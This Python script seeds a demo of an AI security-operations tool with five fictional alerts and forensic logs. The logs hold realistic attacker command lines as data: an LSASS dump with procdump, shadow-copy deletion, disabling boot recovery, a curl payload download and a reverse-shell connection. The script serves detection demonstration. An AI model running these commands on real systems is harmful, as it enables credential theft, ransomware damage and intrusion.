"""
Seed Demo Data - Inserts 5 polished alerts + forensic logs directly into Supabase,
then queues them for AI analysis via /ingest.

Usage: py scripts/seed_demo_data.py
"""

import sys, os, time, requests
from datetime import datetime, timezone, timedelta

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from backend.storage.database import supabase, insert_log_batch

BASE = "http://localhost:5000"
NOW = datetime.now(timezone.utc)


def ts(minutes_ago):
    return (NOW - timedelta(minutes=minutes_ago)).isoformat()


# ═══════════════════════════════════════════════════════════
# 5 Demo Alerts — inserted directly into Supabase
# ═══════════════════════════════════════════════════════════

ALERTS = [
    {
        "alert_name": "LSASS Memory Dump via Procdump - Credential Theft",
        "description": "procdump64.exe accessed lsass.exe memory on domain controller. Process launched from cmd.exe with parent powershell.exe running encoded command. Immediate outbound HTTPS to Tor exit node 185.220.101.45 detected 12 seconds after dump. Hash of procdump binary does not match Microsoft signed version.",
        "severity": "critical",
        "severity_class": "CRITICAL_HIGH",
        "hostname": "DC-FINANCE-01",
        "username": "svc_admin",
        "source_ip": "10.10.1.50",
        "dest_ip": "185.220.101.45",
        "mitre_technique": "T1003.001",
        "timestamp": ts(5),
        "status": "open",
    },
    {
        "alert_name": "Rapid File Encryption - LockBit Ransomware",
        "description": "Over 2,400 files renamed with .lockbit3 extension on shared drive \\\\FILESERV01\\finance$ in under 3 minutes. Originating process rundll32.exe spawned by explorer.exe. Volume Shadow Copy Service snapshots deleted via vssadmin.exe. Ransom note README_RESTORE.txt dropped in every directory.",
        "severity": "critical",
        "severity_class": "CRITICAL_HIGH",
        "hostname": "FILESERV01",
        "username": "svc_backup",
        "source_ip": "10.10.3.100",
        "dest_ip": "10.10.3.1",
        "mitre_technique": "T1486",
        "timestamp": ts(8),
        "status": "open",
    },
    {
        "alert_name": "Malicious NPM Package - Supply Chain Compromise",
        "description": "Developer workstation installed npm package 'lodash-utils-extended' v2.1.0 which executed post-install script downloading unsigned binary from pastebin.com. Binary establishes reverse shell to 45.33.32.156:4444. Package was typosquat of legitimate lodash-utils, published 3 hours ago by unknown maintainer.",
        "severity": "high",
        "severity_class": "CRITICAL_HIGH",
        "hostname": "DEV-LAPTOP-14",
        "username": "dev_sarah",
        "source_ip": "10.10.6.88",
        "dest_ip": "45.33.32.156",
        "mitre_technique": "T1195.002",
        "timestamp": ts(12),
        "status": "open",
    },
    {
        "alert_name": "PowerShell AD Enumeration - Scheduled Access Review",
        "description": "powershell.exe executed Get-ADUser and Get-ADGroup cmdlets querying all domain users and security groups. Executed by IT administrator during business hours from authorized IT workstation. Activity matches scheduled quarterly access review documented in ITSM ticket INC-2026-4481.",
        "severity": "medium",
        "severity_class": "MEDIUM_LOW",
        "hostname": "IT-ADMIN-WS07",
        "username": "admin_jlopez",
        "source_ip": "10.10.2.15",
        "dest_ip": "10.10.1.5",
        "mitre_technique": "T1087.002",
        "timestamp": ts(15),
        "status": "open",
    },
    {
        "alert_name": "Illicit OAuth Consent - Azure AD Account Takeover",
        "description": "OAuth application 'O365 Security Scanner' granted admin consent for Mail.ReadWrite.All, Files.ReadWrite.All, and User.Read.All permissions by CFO account. Consent IP geolocated to Romania, 4,200 miles from user's usual Texas location. App registered 47 minutes ago by unknown tenant. MFA bypassed via legacy authentication protocol.",
        "severity": "high",
        "severity_class": "CRITICAL_HIGH",
        "hostname": "AZURE-AD-TENANT",
        "username": "cfo_williams",
        "source_ip": "185.156.73.44",
        "dest_ip": "40.126.32.140",
        "mitre_technique": "T1550.001",
        "timestamp": ts(20),
        "status": "open",
    },
]


# ═══════════════════════════════════════════════════════════
# Forensic logs — using ACTUAL Supabase column names
# ═══════════════════════════════════════════════════════════

def build_logs(alert_id, idx):
    logs = {}

    if idx == 0:  # LSASS credential theft
        logs["process_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(5), "process_name": "powershell.exe", "parent_process": "explorer.exe", "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...", "process_id": 4812, "hostname": "DC-FINANCE-01", "username": "svc_admin"},
            {"alert_id": alert_id, "timestamp": ts(4), "process_name": "cmd.exe", "parent_process": "powershell.exe", "command_line": "cmd /c procdump64.exe -accepteula -ma lsass.exe lsass.dmp", "process_id": 5920, "hostname": "DC-FINANCE-01", "username": "svc_admin"},
            {"alert_id": alert_id, "timestamp": ts(3), "process_name": "procdump64.exe", "parent_process": "cmd.exe", "command_line": "procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp", "process_id": 6104, "hostname": "DC-FINANCE-01", "username": "svc_admin"},
        ]
        logs["network_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(3), "source_ip": "10.10.1.50", "dest_ip": "185.220.101.45", "dest_port": 443, "protocol": "TLS", "bytes_sent": 2048576, "hostname": "DC-FINANCE-01"},
            {"alert_id": alert_id, "timestamp": ts(2), "source_ip": "10.10.1.50", "dest_ip": "185.220.101.45", "dest_port": 443, "protocol": "TLS", "bytes_sent": 5242880, "hostname": "DC-FINANCE-01"},
        ]
        logs["file_activity_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(3), "action": "CREATE", "file_path": "C:\\Temp\\lsass.dmp", "process_name": "procdump64.exe", "file_size_bytes": 52428800, "hostname": "DC-FINANCE-01"},
            {"alert_id": alert_id, "timestamp": ts(2), "action": "READ", "file_path": "C:\\Temp\\lsass.dmp", "process_name": "powershell.exe", "file_size_bytes": 52428800, "hostname": "DC-FINANCE-01"},
        ]
        logs["windows_event_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(5), "event_id": 4688, "event_type": "Process Creation", "event_message": "New process powershell.exe created with encoded command line arguments", "username": "svc_admin", "hostname": "DC-FINANCE-01"},
            {"alert_id": alert_id, "timestamp": ts(3), "event_id": 10, "event_type": "ProcessAccess", "event_message": "procdump64.exe accessed lsass.exe (PID 672) with PROCESS_VM_READ rights", "username": "svc_admin", "hostname": "DC-FINANCE-01"},
            {"alert_id": alert_id, "timestamp": ts(3), "event_id": 4648, "event_type": "Explicit Credential Use", "event_message": "Logon attempted using explicit credentials - target: DOMAIN\\krbtgt", "username": "svc_admin", "hostname": "DC-FINANCE-01"},
        ]

    elif idx == 1:  # Ransomware
        logs["process_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(8), "process_name": "explorer.exe", "parent_process": "userinit.exe", "command_line": "C:\\Windows\\explorer.exe", "process_id": 3204, "hostname": "FILESERV01", "username": "svc_backup"},
            {"alert_id": alert_id, "timestamp": ts(7), "process_name": "rundll32.exe", "parent_process": "explorer.exe", "command_line": "rundll32.exe C:\\Users\\svc_backup\\AppData\\Local\\Temp\\enc.dll,Start", "process_id": 7892, "hostname": "FILESERV01", "username": "svc_backup"},
            {"alert_id": alert_id, "timestamp": ts(6), "process_name": "vssadmin.exe", "parent_process": "rundll32.exe", "command_line": "vssadmin.exe delete shadows /all /quiet", "process_id": 8104, "hostname": "FILESERV01", "username": "svc_backup"},
            {"alert_id": alert_id, "timestamp": ts(5), "process_name": "bcdedit.exe", "parent_process": "rundll32.exe", "command_line": "bcdedit /set {default} recoveryenabled No", "process_id": 8200, "hostname": "FILESERV01", "username": "svc_backup"},
        ]
        logs["file_activity_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(6), "action": "RENAME", "file_path": "\\\\FILESERV01\\finance$\\Q4_Report.xlsx -> Q4_Report.xlsx.lockbit3", "process_name": "rundll32.exe", "file_size_bytes": 245000, "hostname": "FILESERV01"},
            {"alert_id": alert_id, "timestamp": ts(6), "action": "RENAME", "file_path": "\\\\FILESERV01\\finance$\\Payroll_Jan.csv -> Payroll_Jan.csv.lockbit3", "process_name": "rundll32.exe", "file_size_bytes": 180000, "hostname": "FILESERV01"},
            {"alert_id": alert_id, "timestamp": ts(5), "action": "CREATE", "file_path": "\\\\FILESERV01\\finance$\\README_RESTORE.txt", "process_name": "rundll32.exe", "file_size_bytes": 4096, "hostname": "FILESERV01"},
            {"alert_id": alert_id, "timestamp": ts(5), "action": "DELETE", "file_path": "C:\\Windows\\System32\\config\\systemprofile\\Shadow Copy", "process_name": "vssadmin.exe", "file_size_bytes": 0, "hostname": "FILESERV01"},
        ]
        logs["windows_event_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(7), "event_id": 4688, "event_type": "Process Creation", "event_message": "rundll32.exe spawned from explorer.exe loading suspicious DLL from Temp directory", "username": "svc_backup", "hostname": "FILESERV01"},
            {"alert_id": alert_id, "timestamp": ts(6), "event_id": 8222, "event_type": "VSS Deletion", "event_message": "Volume Shadow Copy Service snapshots deleted - all shadow copies removed", "username": "svc_backup", "hostname": "FILESERV01"},
            {"alert_id": alert_id, "timestamp": ts(5), "event_id": 1102, "event_type": "Log Cleared", "event_message": "Security event log was cleared by svc_backup", "username": "svc_backup", "hostname": "FILESERV01"},
        ]
        logs["network_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(8), "source_ip": "10.10.3.100", "dest_ip": "10.10.3.1", "dest_port": 445, "protocol": "SMB", "bytes_sent": 0, "hostname": "FILESERV01"},
        ]

    elif idx == 2:  # Supply chain NPM
        logs["process_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(12), "process_name": "npm.cmd", "parent_process": "node.exe", "command_line": "npm install lodash-utils-extended@2.1.0", "process_id": 9204, "hostname": "DEV-LAPTOP-14", "username": "dev_sarah"},
            {"alert_id": alert_id, "timestamp": ts(11), "process_name": "node.exe", "parent_process": "npm.cmd", "command_line": "node scripts/postinstall.js", "process_id": 9380, "hostname": "DEV-LAPTOP-14", "username": "dev_sarah"},
            {"alert_id": alert_id, "timestamp": ts(10), "process_name": "curl.exe", "parent_process": "node.exe", "command_line": "curl -s -o %TEMP%\\update.exe https://pastebin.com/raw/x8Kd92mN", "process_id": 9502, "hostname": "DEV-LAPTOP-14", "username": "dev_sarah"},
            {"alert_id": alert_id, "timestamp": ts(9), "process_name": "update.exe", "parent_process": "node.exe", "command_line": "%TEMP%\\update.exe --connect 45.33.32.156:4444", "process_id": 9680, "hostname": "DEV-LAPTOP-14", "username": "dev_sarah"},
        ]
        logs["network_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(11), "source_ip": "10.10.6.88", "dest_ip": "104.20.67.143", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 12048, "hostname": "DEV-LAPTOP-14"},
            {"alert_id": alert_id, "timestamp": ts(9), "source_ip": "10.10.6.88", "dest_ip": "45.33.32.156", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 1024, "hostname": "DEV-LAPTOP-14"},
            {"alert_id": alert_id, "timestamp": ts(8), "source_ip": "10.10.6.88", "dest_ip": "45.33.32.156", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 8192, "hostname": "DEV-LAPTOP-14"},
        ]
        logs["file_activity_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(11), "action": "CREATE", "file_path": "C:\\Users\\dev_sarah\\project\\node_modules\\lodash-utils-extended\\scripts\\postinstall.js", "process_name": "npm.cmd", "file_size_bytes": 2048, "hostname": "DEV-LAPTOP-14"},
            {"alert_id": alert_id, "timestamp": ts(10), "action": "CREATE", "file_path": "C:\\Users\\dev_sarah\\AppData\\Local\\Temp\\update.exe", "process_name": "curl.exe", "file_size_bytes": 524288, "hostname": "DEV-LAPTOP-14"},
        ]
        logs["windows_event_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(10), "event_id": 4688, "event_type": "Process Creation", "event_message": "curl.exe downloading binary from pastebin.com spawned by node.exe post-install script", "username": "dev_sarah", "hostname": "DEV-LAPTOP-14"},
            {"alert_id": alert_id, "timestamp": ts(9), "event_id": 3, "event_type": "Network Connection", "event_message": "update.exe establishing outbound TCP connection to 45.33.32.156:4444 (known C2 port)", "username": "dev_sarah", "hostname": "DEV-LAPTOP-14"},
        ]

    elif idx == 3:  # Benign AD enumeration
        logs["process_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(15), "process_name": "powershell.exe", "parent_process": "explorer.exe", "command_line": "powershell.exe -NoProfile Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties Department,Title | Export-Csv access_review.csv", "process_id": 2104, "hostname": "IT-ADMIN-WS07", "username": "admin_jlopez"},
            {"alert_id": alert_id, "timestamp": ts(14), "process_name": "powershell.exe", "parent_process": "explorer.exe", "command_line": "powershell.exe Get-ADGroup -Filter * -Properties Members | Select Name,@{N='Count';E={$_.Members.Count}}", "process_id": 2104, "hostname": "IT-ADMIN-WS07", "username": "admin_jlopez"},
        ]
        logs["network_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(15), "source_ip": "10.10.2.15", "dest_ip": "10.10.1.5", "dest_port": 389, "protocol": "LDAP", "bytes_sent": 4096, "hostname": "IT-ADMIN-WS07"},
            {"alert_id": alert_id, "timestamp": ts(14), "source_ip": "10.10.2.15", "dest_ip": "10.10.1.5", "dest_port": 389, "protocol": "LDAP", "bytes_sent": 8192, "hostname": "IT-ADMIN-WS07"},
        ]
        logs["file_activity_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(14), "action": "CREATE", "file_path": "C:\\Users\\admin_jlopez\\Documents\\access_review.csv", "process_name": "powershell.exe", "file_size_bytes": 156000, "hostname": "IT-ADMIN-WS07"},
        ]
        logs["windows_event_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(15), "event_id": 4662, "event_type": "Directory Service Access", "event_message": "admin_jlopez performed LDAP query against Active Directory - standard access review operation", "username": "admin_jlopez", "hostname": "IT-ADMIN-WS07"},
            {"alert_id": alert_id, "timestamp": ts(15), "event_id": 4624, "event_type": "Logon Success", "event_message": "Successful interactive logon from authorized IT workstation via Kerberos", "username": "admin_jlopez", "hostname": "IT-ADMIN-WS07"},
        ]

    elif idx == 4:  # OAuth cloud attack
        logs["process_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(20), "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe https://login.microsoftonline.com/common/oauth2/authorize?client_id=malicious-app-id", "process_id": 11204, "hostname": "AZURE-AD-TENANT", "username": "cfo_williams"},
        ]
        logs["network_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(20), "source_ip": "185.156.73.44", "dest_ip": "40.126.32.140", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 2048, "hostname": "AZURE-AD-TENANT"},
            {"alert_id": alert_id, "timestamp": ts(19), "source_ip": "185.156.73.44", "dest_ip": "52.96.166.130", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 524288, "hostname": "AZURE-AD-TENANT"},
            {"alert_id": alert_id, "timestamp": ts(18), "source_ip": "185.156.73.44", "dest_ip": "13.107.6.171", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 1048576, "hostname": "AZURE-AD-TENANT"},
        ]
        logs["windows_event_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(20), "event_id": 50125, "event_type": "OAuth Consent Grant", "event_message": "Admin consent granted to app 'O365 Security Scanner' for Mail.ReadWrite.All, Files.ReadWrite.All, User.Read.All from IP 185.156.73.44 (Romania)", "username": "cfo_williams", "hostname": "AZURE-AD-TENANT"},
            {"alert_id": alert_id, "timestamp": ts(20), "event_id": 50105, "event_type": "Suspicious Login", "event_message": "Login from atypical location Romania - 4,200 miles from last login in Houston TX. Legacy auth protocol used, MFA bypassed.", "username": "cfo_williams", "hostname": "AZURE-AD-TENANT"},
            {"alert_id": alert_id, "timestamp": ts(19), "event_id": 50140, "event_type": "Mail Access", "event_message": "Application 'O365 Security Scanner' accessed 847 mailbox items via Graph API within 60 seconds of consent", "username": "cfo_williams", "hostname": "AZURE-AD-TENANT"},
        ]
        logs["file_activity_logs"] = [
            {"alert_id": alert_id, "timestamp": ts(18), "action": "READ", "file_path": "OneDrive://Finance/Board_Presentation_Q1_2026.pptx", "process_name": "Graph API", "file_size_bytes": 8500000, "hostname": "AZURE-AD-TENANT"},
            {"alert_id": alert_id, "timestamp": ts(18), "action": "READ", "file_path": "OneDrive://Finance/M_and_A_Target_Valuation.xlsx", "process_name": "Graph API", "file_size_bytes": 2400000, "hostname": "AZURE-AD-TENANT"},
        ]

    return logs


# ═══════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("  AI-SOC WATCHDOG - LinkedIn Demo Data Seeder")
    print("=" * 60)

    # Phase 1: Insert alerts directly into Supabase
    print("\n--- Phase 1: Inserting 5 alerts into Supabase ---\n")

    alert_ids = []
    for i, alert in enumerate(ALERTS):
        try:
            resp = supabase.table('alerts').insert(alert).execute()
            aid = resp.data[0]['id']
            alert_ids.append(aid)
            print(f"  [{i+1}/5] {alert['alert_name'][:55]:55s} -> OK  ({aid[:12]}...)")
        except Exception as e:
            alert_ids.append(None)
            print(f"  [{i+1}/5] {alert['alert_name'][:55]:55s} -> FAIL: {e}")

    # Phase 2: Seed forensic logs
    print("\n--- Phase 2: Seeding forensic logs ---\n")

    total_logs = 0
    for i, aid in enumerate(alert_ids):
        if not aid:
            print(f"  [{i+1}/5] Skipped (no ID)")
            continue

        logs = build_logs(aid, i)
        count = 0
        for table, rows in logs.items():
            result = insert_log_batch(table, rows)
            if result:
                count += len(rows)
            else:
                print(f"         WARN: {table} insert failed for alert {i+1}")
        total_logs += count
        print(f"  [{i+1}/5] {ALERTS[i]['alert_name'][:55]:55s} -> {count} logs")

    # Phase 3: Queue for AI analysis via /ingest re-analyze
    print("\n--- Phase 3: Queueing for AI analysis ---\n")

    try:
        requests.get(f"{BASE}/api/health", timeout=3)
        backend_up = True
    except Exception:
        backend_up = False
        print("  Backend not running - alerts stored but won't be AI-analyzed until you start it.")

    if backend_up:
        for i, aid in enumerate(alert_ids):
            if not aid:
                continue
            try:
                resp = requests.post(f"{BASE}/api/alerts/{aid}/reanalyze", timeout=10)
                status = "queued" if resp.status_code == 200 else f"ERR {resp.status_code}"
                print(f"  [{i+1}/5] {ALERTS[i]['alert_name'][:55]:55s} -> {status}")
            except Exception as e:
                print(f"  [{i+1}/5] {ALERTS[i]['alert_name'][:55]:55s} -> FAIL: {e}")
            time.sleep(1)

    # Done
    print("\n" + "=" * 60)
    print(f"  DONE: {len([a for a in alert_ids if a])} alerts + {total_logs} forensic logs seeded")
    if backend_up:
        print(f"  Alerts queued for AI analysis (~30-60s each)")
    print(f"  Open http://localhost:5173 to see them!")
    print("=" * 60 + "\n")
